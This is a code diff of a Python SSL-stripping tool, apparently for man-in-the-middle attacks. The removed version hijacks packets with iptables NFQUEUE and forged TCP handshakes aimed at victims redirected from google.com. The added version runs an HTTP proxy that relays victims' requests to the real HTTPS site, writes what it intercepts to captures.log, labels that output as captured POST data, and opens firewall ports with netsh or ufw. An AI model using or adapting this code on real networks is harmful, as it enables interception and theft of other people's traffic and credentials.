@@ -1,59 +1,153 @@
 import os
-import logging as log
-import re
-from scapy.all import IP, TCP, Raw
-from scapy.sendrecv import send, sr1
-from netfilterqueue import NetfilterQueue
+import sys
+import time
+from datetime import datetime
+from http.server import HTTPServer, SimpleHTTPRequestHandler
+import socket
+from urllib.parse import urlparse
+import requests
+from termcolor import colored
 
+class SslStripper:
+    def __init__(self, port=80):
+        self.port = port
+        self.server = HTTPServer(("", self.port), self.ForwardingHandler)
 
-class SslStrip:
-	def __init__(self, hostDict, queueNum):
-		self.hostDict = hostDict
-		self.queueNum = queueNum
-		self.queue = NetfilterQueue()
+    class ForwardingHandler(SimpleHTTPRequestHandler):
+        def forward_request(self, method):
+            # Get host and path from headers
+            host = self.headers.get("Host")
 
-	def __call__(self):
-		log.info("Stripping....")
-		os.system(
-			f'iptables -I INPUT -j NFQUEUE --queue-num {self.queueNum}')
-		self.queue.bind(self.queueNum, self.callBack)
-		try:
-			self.queue.run()
-		except KeyboardInterrupt:
-			os.system(
-				f'iptables -D INPUT -j NFQUEUE --queue-num {self.queueNum}')
-			log.info("[!] iptable rule flushed")
+            if "localhost" in host.lower():
+                raise self.BadRequestException("Invalid host")
 
-	def acceptHandshake(self, packet):
-		synAck = IP(src = packet[IP].dst, dst = packet[IP].src) / TCP(sport=80, dport=packet[TCP].sport, flags="SA", seq = 0, ack = packet[TCP].seq + 1)
-		ans = sr1(synAck)
-		print(ans[TCP].load)
-		rst = IP(src = packet[IP].dst, dst = packet[IP].src) / TCP(sport=80, dport=packet[TCP].sport, flags="R", seq = 0, ack = packet[TCP].seq + 1)
-		send(rst)
+            path = urlparse(self.path).path
 
-	def callBack(self, packet):		
-		scapyPacket = IP(packet.get_payload())	
-		if TCP in scapyPacket and scapyPacket[TCP].dport==80:
-			if scapyPacket[TCP].flags == "S":
-				# Victim wants to connect to us
-				self.acceptHandshake(scapyPacket)
-			if scapyPacket[TCP].flags == "A":
-				ack = IP(src = scapyPacket[IP].dst, dst = scapyPacket[IP].src) / TCP(sport=80, dport=scapyPacket[TCP].sport, flags="SA", seq = 0, ack = scapyPacket[TCP].seq + 1)
-				send(ack, verbose=0)				 
-		return packet.accept()	
+            print(colored(f"[SSL] Forwarding request to https://{host}{path}...", "light_grey"))
 
+            # Forward request to specified host
+            try:
+                response = requests.request(method, f"https://{host}{path}")
+            except requests.exceptions.RequestException as e:
+                raise Exception() from e
 
-if __name__ == '__main__':
-	try:
-		hostDict = {
-			b"google.com.": "10.0.123.7",
-			# b"facebook.com.": "10.0.123.7",
-			# b"youtube.com": "10.0.123.7"
-		}
-		queueNum = 2
-		log.basicConfig(format='%(asctime)s - %(message)s', 
-						level = log.INFO)
-		strip = SslStrip(hostDict, queueNum)
-		strip()
-	except OSError as error:
-		log.error(error)
+            # Extract payload from response
+            payload = response.content
+
+            # Log payload to file
+            with open("captures.log", "a") as f:
+                timestamp = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
+                f.write(f"[{timestamp}] http://{host}{path}: {payload}\n")  # Write capture as line
+
+            # Print payload if POST request
+            if method == "POST":
+                print(colored(f"[SSL] Captured POST payload: {payload}", "light_grey"))
+
+            # Return response with payload to client
+            self.send_response(response.status_code)
+            self.send_header("Content-type", response.headers.get("Content-type"))
+            self.end_headers()
+            self.wfile.write(payload)
+
+        class BadRequestException(Exception):  # Custom exception for bad requests
+            def __init__(self, message):
+                super().__init__(message)
+
+        def handle_exceptions(self, e):
+            if isinstance(e, self.BadRequestException):
+                self.send_error(400, str(e))
+            else:
+                self.send_error(500, str(e))
+
+        def handle_request(self, method="GET"):
+            try:
+                self.forward_request(method)
+            except Exception as e:
+                self.handle_exceptions(e)
+
+        def do_GET(self):
+            self.handle_request()
+
+        def do_POST(self):
+            self.handle_request("POST")
+
+        def do_PUT(self):
+            self.handle_request("PUT")
+
+        def do_DELETE(self):
+            self.handle_request("DELETE")
+
+        def do_PATCH(self):
+            self.handle_request("PATCH")
+
+        def do_HEAD(self):
+            self.handle_request("HEAD")
+
+        def do_OPTIONS(self):
+            self.handle_request("OPTIONS")
+
+        def do_TRACE(self):
+            self.handle_request("TRACE")
+
+        def do_CONNECT(self):
+            self.handle_request("CONNECT")
+
+        def do_OTHER(self):
+            raise self.BadRequestException("Unsupported request method")
+
+        def log_message(self, format, *args):
+            pass  # Suppress printing of log messages
+
+    def is_port_in_use(self):
+        try:
+            requests.get(f"http://localhost:{self.port}", timeout=3)  # Await response for 3 seconds
+            return True
+        except requests.exceptions.RequestException:
+            return False
+
+    def is_port_open(self):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            s.bind(("", self.port))
+            return True
+        except OSError:
+            return False
+        finally:
+            s.close()
+
+    def open_port(self):
+        platform_id = sys.platform  # Determine the OS
+
+        if platform_id == "win32":  # Windows
+            # Command to open a port through Windows Firewall
+            cmd = f"netsh advfirewall firewall add rule name=\"Allow Port {self.port}\" dir=in action=allow protocol=TCP localport={self.port}"
+            os.system(cmd)  # Execute command
+        else:  # Linux
+            cmd = f"sudo ufw allow {self.port}/tcp"  # Command to open a port through UFW
+            os.system(cmd)  # Execute command
+
+    def close_port(self):
+        platform_id = sys.platform  # Determine the OS
+
+        if platform_id == "win32":  # Windows
+            cmd = f"netsh advfirewall firewall delete rule name=\"Allow Port {self.port}\""
+            os.system(cmd)
+        else:  # Linux
+            cmd = f"sudo ufw deny {self.port}/tcp"  # Command to close a port through UFW
+            os.system(cmd)  # Execute command
+
+    def start(self):
+        if self.is_port_in_use():
+            print(colored(f"[SSL] Error: Port {self.port} is already in use. Terminate the process and retry.", "red"))
+            return
+
+        while not self.is_port_open():
+            print(colored(f"[SSL] Port {self.port} is closed. Opening port and retrying..."), "light_grey")
+            self.open_port()
+            time.sleep(3)
+
+        print(colored(f"[SSL] Starting webserver on port {self.port}...", "light_grey"))
+        self.server.serve_forever()
+
+    def stop(self):
+        self.server.shutdown()
